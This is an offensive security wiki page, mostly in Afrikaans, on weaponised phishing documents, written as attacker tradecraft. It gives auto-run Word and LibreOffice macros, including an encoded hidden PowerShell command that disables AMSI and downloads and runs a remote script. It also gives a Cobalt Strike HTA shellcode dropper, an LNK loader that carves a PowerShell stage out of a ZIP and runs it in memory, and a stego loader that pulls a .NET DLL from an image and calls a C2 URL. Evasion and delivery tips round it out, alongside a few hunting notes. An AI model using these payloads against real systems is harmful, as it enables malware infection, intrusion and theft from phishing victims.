# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Dokumente

Microsoft Word voer dat dit ’n lêer oopmaak, voer lêergegevensvalidasie uit. Gegevensvalidasie word uitgevoer in die vorm van datastruktuur-identifikasie, teen die OfficeOpenXML-standaard. As enige fout plaasvind tydens die datastruktuur-identifikasie, sal die lêer wat ontleed word nie oopgemaak word nie.

Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul macro-uitvoeringsvermoë te behou.\
Byvoorbeeld, ’n RTF-lêer ondersteun nie macros nie, by ontwerp, maar ’n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal in staat wees tot macro-uitvoering.\
Dieselfde interne werking en meganismes is van toepassing op alle sagteware van die Microsoft Office Suite (Excel, PowerPoint ens.).

Jy kan die volgende opdrag gebruik om te kyk watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat na ’n afgeleë template verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros insluit, kan ook macros “execute”.

### External Image Load

Gaan na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Dit is moontlik om macros te gebruik om arbitrêre code uit die document te run.

#### Autoload functions

Hoe meer algemeen hulle is, hoe groter is die kans dat die AV hulle sal detect.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector sal oopmaak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc Extension

Wanneer jy klaar is, kies die **Save as type**-aftreklys, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
Doen dit omdat jy **nie macros in 'n `.docx` kan stoor nie** en daar is 'n **stigma** **rondom** die macro-enabled **`.docm`**-uitbreiding (bv. die thumbnail-ikoon het ’n groot `!` en sommige web/email gateway blokkeer hulle heeltemal). Daarom is hierdie **legacy `.doc`-uitbreiding die beste kompromie**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer-dokumente kan Basic macros inbed en hulle outomaties uitvoer wanneer die lêer oopgemaak word deur die macro aan die **Open Document**-gebeurtenis te bind (Tools → Customize → Events → Open Document → Macro…). ’n Eenvoudige reverse shell macro lyk soos:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Let op die dubbele aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik dit om letterlike aanhalingstekens te ontsnap, so payloads wat eindig met `...==""")` hou beide die innerlike command en die Shell-argument gebalanseerd.

Afleweringwenke:

- Stoor as `.odt` en bind die macro aan die dokumentgebeurtenis sodat dit onmiddellik loop wanneer dit oopgemaak word.
- Wanneer jy met `swaks` e-pos stuur, gebruik `--attach @resume.odt` (die `@` is nodig sodat die lêerbytes, nie die lêernaam-string nie, as die aanhangsel gestuur word). Dit is krities wanneer SMTP-servers misbruik word wat arbitrêre `RCPT TO` ontvangers sonder validasie aanvaar.

## HTA Files

'n HTA is 'n Windows-program wat **HTML en scripting languages (soos VBScript en JScript)** kombineer. Dit genereer die user interface en voer uit as 'n "fully trusted" toepassing, sonder die beperkings van 'n browser se security model.

'n HTA word uitgevoer met **`mshta.exe`**, wat tipies saam met **Internet Explorer** **geïnstalleer** word, wat **`mshta` afhanklik van IE** maak. So as dit gedeïnstalleer is, sal HTA's nie kan execute nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Daar is verskeie maniere om **NTLM authentication “remote” te forseer**, byvoorbeeld, jy kan **onsigbare beelde** by e-posse of HTML voeg wat die gebruiker sal oopmaak (selfs HTTP MitM?). Of stuur aan die slagoffer die **adres van lêers** wat **authentication** sal **trigger** net deur **die vouer oop te maak**.

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moenie vergeet dat jy nie net die hash of die authentication kan steel nie, maar ook **NTLM relay attacks** kan uitvoer:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hoogs effektiewe veldtogte lewer ’n ZIP wat twee wettige lokaasdokumente (PDF/DOCX) en ’n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell loader binne die ZIP se rou bytes ná ’n unieke merker gestoor is, en die .lnk sny dit uit en voer dit heeltemal in memory uit.

Tipiese vloei wat deur die .lnk PowerShell one-liner geïmplementeer word:

1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, en die ouer van die huidige working directory.
2) Lees die ZIP-bytes en vind ’n hardcoded merker (bv. xFIQCV). Alles ná die merker is die ingebedde PowerShell payload.
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit, en open die lokaas .docx om legitiem te lyk.
4) Bypass AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate die volgende stage (bv. verwyder alle # karakters) en voer dit in memory uit.

Voorbeeld PowerShell skeleton om die ingebedde stage uit te sny en uit te voer:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- Aflewering misbruik dikwels betroubare PaaS-subdomeine (bv. *.herokuapp.com) en kan payloads poort (benign ZIPs bedien op grond van IP/UA).
- Die volgende stadium dekripteer dikwels base64/XOR shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyf-artefakte te minimaliseer.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langlopende besigheidsdrade wat eindig met skakels wat onder vertroude PaaS-domeine gehuisves word.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Nog ’n herhalende patroon is ’n **document-impersonating `.lnk`** wat onmiddellik ’n onskuldige loklêer oopmaak terwyl dit die werklike ketting in die agtergrond opstel.

Waargenome werkvloei:
1. Die shortcut **masquerades as a PDF** en gebruik `conhost.exe` of ’n soortgelyke proxy om ’n obfuscated PowerShell downloader te begin.
2. Die PowerShell fragmenteer voor die hand liggende tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) sodat naïewe detections wat na `iwr`, `gci`, `ren`, `cpi`, of `schtasks` soek die command mis.
3. Die stager download die **decoy document first**, open dit vir die slagoffer, en rekonstrueer dan die kwaadwillige files in die agtergrond.
4. Payloads may be written with **junk extensions** and then renamed by stripping filler characters, delaying the appearance of obvious `.exe` / `.cpl` artifacts.
5. Persistence is established with a **minute-based scheduled task** that launches a trusted host binary from a user-writable path.

Minimal hunting clues from this pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
A useful staging layout to recognize is:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Why the second stage is stealthy

In the Rapid7 case study, the scheduled task repeatedly launched **`Fondue.exe`** from `C:\Users\Public\`. Because **`APPWIZ.cpl`** was staged next to it and exported **`RunFODW`**, the trusted Microsoft binary side-loaded the attacker CPL instead of the legitimate system copy.

The CPL then:
- Lees 'n **AES-256-CBC** blob van `C:\Windows\Tasks\editor.dat`
- Ontsleutel dit via **Windows CNG / `bcrypt.dll`**
- Ken uitvoerbare geheue toe en kopieer die ontsleutelde shellcode
- Voer dit indirek uit deur die shellcode-wysiger as die callback vir **`EnumUILanguagesW`** te gee

Daardie laaste stap is die moeite werd om apart te jag: malware vermy dikwels ’n direkte `((void(*)())buf)()`-sprong en misbruik eerder ’n **legitimate callback-taking WinAPI** om uitvoering oor te dra.

Die ontsleutelde payload in hierdie veldtog was **Donut** shellcode, wat dan die finale PE volledig in geheue gemap en **AMSI/WLDP/ETW** in die huidige proses gepatch het voordat uitvoering oorgedra is. Vir dieper notas oor side-loading en memory-resident post-processing, sien:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktiese hunting pivots:
- `.lnk` wat `powershell.exe` of `conhost.exe` spawn, gevolg deur ’n sigbare decoy-dokument.
- Kortstondige downloads na **`C:\Users\Public\`** gevolg deur onmiddellike hernoemings vanaf nonsens-uitbreidings.
- Scheduled tasks met vae name soos `GoogleErrorReport` wat vanaf **user-writable directories** uitvoer.
- Trusted binaries wat **`.cpl` / `.dll`**-lêers vanaf dieselfde nie-stelselgids laai.
- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf word en dan deur die side-loaded module gelees word.

## Steganography-delimited payloads in images (PowerShell stager)

Onlangse loader-kettings lewer ’n obfuscated JavaScript/VBS wat ’n Base64 PowerShell stager dekodeer en uitvoer. Daardie stager laai ’n image (dikwels GIF) af wat ’n Base64-geënkodeerde .NET DLL bevat wat as gewone teks tussen unieke start/end markers versteek is. Die script soek na hierdie delimiters (voorbeelde wat in die wild gesien is: «<<sudo_png>> … <<sudo_odt>>>»), haal die tussen-teks uit, Base64-dekodeer dit na bytes, laai die assembly in-memory en roep ’n bekende entry method met die C2 URL aan.

Workflow
- Stage 1: Archived JS/VBS dropper → dekodeer ingebedde Base64 → begin PowerShell stager met -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → laai image af, sny marker-delimited Base64 uit, laai die .NET DLL in-memory en roep sy method aan (bv. VAI) terwyl die C2 URL en options deurgegee word.
- Stage 3: Loader haal die finale payload op en inject dit tipies via process hollowing in ’n trusted binary (gewoonlik MSBuild.exe). Sien meer oor process hollowing en trusted utility proxy execution hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- Dit is ATT&CK T1027.003 (steganography/marker-hiding). Markers verskil tussen campaigns.
- AMSI/ETW bypass and string deobfuscation word algemeen toegepas before loading the assembly.
- Hunting: scan downloaded images for known delimiters; identify PowerShell accessing images and immediately decoding Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeleton logic (abstract):
- Read own file contents
- Locate a Base64 blob between junk strings
- Decode to ASCII PowerShell
- Execute with `wscript.exe`/`cscript.exe` invoking `powershell.exe`

Hunting cues
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.

## Windows files to steal NTLM hashes

Check the page about **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
